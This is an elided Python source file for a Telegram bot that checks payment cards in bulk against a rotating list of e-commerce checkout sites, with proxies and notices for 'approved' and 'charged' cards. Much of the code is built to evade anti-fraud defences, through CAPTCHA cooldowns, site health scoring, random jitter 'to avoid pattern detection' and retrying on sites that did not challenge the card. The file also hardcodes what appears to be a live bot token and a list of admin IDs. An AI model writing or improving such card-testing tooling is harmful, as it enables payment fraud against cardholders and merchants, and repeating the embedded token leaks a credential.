...
BOT_TOKEN = "8575062345:AAEyCnuaytQsRExU7VnseWVL-pzkEmFSEGk"
...
# Load user agents on module import
load_user_agents()
...
# CAPTCHA Cooldown System - sites that give CAPTCHA need cooldown before retry
            ...
            if mode:
                if mode == '1':
                    ...
                    if option == '1':
                        ...
                        # Default to 2 retries if option not specified
                        return {"captcha_mode": "WITH_RETRY", "max_retries": 2}
...
def set_site_captcha_cooldown(site_url: str):
    ...
    try:
        ...
        with CAPTCHA_COOLDOWN_LOCK:
            ...
            # Clean old cooldowns (expired more than 5 minutes ago)
...
def update_site_health(site_url: str, result_type: str):
    ...
    try:
        with SITE_HEALTH_LOCK:
            ...
            # Success = +points, CAPTCHA = -heavy penalty, Error = -penalty
            # Increased CAPTCHA penalty from 50 to 70 to be more aggressive
            if site["total"] > 0:
...
def get_optimized_sites(sites: List[str], min_health_score: float = 30.0, max_sites: int = None, exclude_cooldown: bool = True) -> List[str]:
    ...
    try:
        ...
        for normalized, original in normalized_map.items():
            # Check if site is in CAPTCHA cooldown
        ...
        # ALL sites are included (except cooldown), just reordered by health!
        optimized = []
...
# Suppress httpx INFO logs (Telegram API requests)
...
HARDCODED_ADMIN_IDS = [6307224822, 6028572049, 5646492454, 6224953439, 5733576801, 8589401957, -1002798580895]
...
try:
    ...
    ADMIN_IDS = set([6307224822, 6028572049, 5646492454, 8589401957, 5733576801])
...
def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[Dict[str, str]] = None, runner=None) -> Tuple[str, str, str, str, Optional[str], Optional[str], Optional[str]]:
    ...
    # Test card: always return charged
    try:
    ...
    # Track last CAPTCHA error to return it if all sites fail with CAPTCHA
    ...
    # Optimize sites by health score - healthy sites first
    try:
    ...
    if total_sites > 0:
        try:
            # Use smaller offset to prefer healthy sites (which are now at the front)
            # Instead of full rotation, use only 20% of sites for offset
    ...
    for site_idx, site in enumerate(ordered_sites):
        ...
        if site_idx > 0:
            ...
            if batch_size and batch_size > 1000:
                # Large batches: moderate delay to reduce proxy errors and CAPTCHA
                time.sleep(random.uniform(0.5, 1.0))  # Increased from 200-500ms to 500ms-1s
            else:
                # Small batches: longer delay to prevent rate limiting and CAPTCHA
                # Reduced iterations but increased delay for more consistent timing
                for _ in range(2):
                    try:
                        if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                            return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
                        ...
                        pass
                    time.sleep(random.uniform(0.5, 1.2))  # 500ms-1.2s per iteration = 1-2.4s total
        ...
        try:
            ...
            status = classify_prefix(code_display)
            if status == "unknown":
                # Track CAPTCHA errors so we can return them at the end
                try:
...
class BatchRunner:
    def __init__(self, cards: List[Dict], sites: List[str], executor: ThreadPoolExecutor, batch_id: str, chat_id: int, user_id: int, cancel_event: asyncio.Event, send_approved_notifications: bool = True, proxies_override: Optional[Dict[str, str]] = None, start_from: int = 0, total_override: Optional[int] = None, captcha_mode: str = "WITH_RETRY"):
        self.cards = cards
    ...
    async def run_with_notifications(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
            ...
            async with sem:
                ...
                while True:
                    ...
                    try:
                        ...
                        if status == "unknown":
                            # Check if it's a CAPTCHA error - don't retry in run_one, let batch runner handle it
                            code_upper_check = (code_display or "").upper()
                            if "CAPTCHA_REQUIRED" in code_upper_check:
                                # Return immediately, batch runner will queue for retry
        ...
        for t in asyncio.as_completed(tasks):
            ...
            # Check for CAPTCHA_REQUIRED - add to retry queue instead of counting as processed
            is_captcha_error = False
            if isinstance(code_display, str):
                code_upper = code_display.upper()
                # Check for CAPTCHA_REQUIRED in any format
                if "CAPTCHA_REQUIRED" in code_upper:
                    ...
                    # WITH_RETRY mode: normal retry logic
                    ...
                    if should_retry:
                        # Track the site that gave CAPTCHA so we can exclude it on retry
                        if site_url:
                        ...
                        # Add to retry queue, don't process yet
                        ...
                        # Don't increment processed - will be processed in retry
        ...
        # ============ CAPTCHA RETRY LOGIC ============
        # Retry cards that got CAPTCHA_REQUIRED errors (only in WITH_RETRY mode)
        if self.captcha_mode == "WITH_RETRY" and self.captcha_retry_cards and not self.cancel_event.is_set() and not self.paused_for_proxies:
            ...
            # Wait for CAPTCHA cooldown period before retrying
            # This gives sites time to "forget" about the previous attempt
            ...
            async def retry_one_card(retry_card: Dict):
                async with retry_sem:
                    try:
                        # Add random jitter between retries to avoid pattern detection
                        ...
                        # Get sites to exclude for this card (sites that gave CAPTCHA)
                        card_number = str(retry_card.get("number", ""))
                        excluded_sites = self.captcha_excluded_sites.get(card_number, [])
                        
                        # Filter out excluded sites AND sites in cooldown
                        if excluded_sites:
                        ...
                        # If all sites are excluded or in cooldown, use original sites as fallback
            ...
            while self.captcha_retry_cards and not self.cancel_event.is_set():
                ...
                # For non-infinite mode, filter out cards that exceeded max retries
                if self.captcha_max_retries != -1:
                    ...
                    for card in self.captcha_retry_cards:
                        ...
                        # current_count represents "retry attempt number" (1 = 1st retry, 2 = 2nd retry, etc)
...
async def cmd_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Ask about approved CC preference (CAPTCHA mode is now global)
        ...
        async def process_cards_individually():
            ...
            for idx, card in enumerate(cards):
                ...
                while True:  # Retry loop
                    ...
                    # Get sites to use (exclude ones that gave CAPTCHA)
                    ...
                    if is_captcha:
                        if captcha_mode == "NO_RETRY":
                            ...
                            # WITH_RETRY mode: retry logic
                            retry_attempt += 1
                            should_retry = (max_retries == -1) or (retry_attempt <= max_retries)
                            
                            if should_retry:
                                # Exclude this site from next retry
                                if site_url:
            ...
            # Send CAPTCHA cards file if any in NO_RETRY mode
    ...
    def verify_proxy_with_ipwhois(proxy_url: str, timeout: int = 15) -> Tuple[bool, str]:
        ...
        try:
            ...
            if response.status_code == 200:
                try:
                    data = response.json()
                    # ipwho.is returns IP info if successful
                    ...
                    # Even if JSON parsing fails, proxy worked if we got 200
                    return True, f"Connected (status: {response.status_code})"
            else:
...
async def cmd_health(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        # Get current sites from working_sites.txt
        sites = checkout.read_sites_from_file("working_sites.txt") or []
...
async def cmd_removeun(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        # Write healthy sites back to file
        try:
            with open("working_sites.txt", "w", encoding="utf-8") as f:
        ...
        # Also clear health data for removed sites
        with SITE_HEALTH_LOCK:
...
def main():
    ...
    if config:
        ...
        # No config file, prompt for manual selection
        print("\n" + "="*60)
